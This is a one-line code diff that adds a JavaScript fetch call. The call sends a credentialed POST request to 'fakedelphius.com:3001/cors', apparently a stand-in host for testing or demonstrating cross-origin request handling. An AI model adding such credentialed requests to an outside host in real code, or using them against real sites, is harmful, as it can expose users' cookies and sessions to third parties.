@@ -1,0 +1,1 @@
+fetch("https://fakedelphius.com:3001/cors", {credentials:"include", method:"POST"}).catch(console.log)
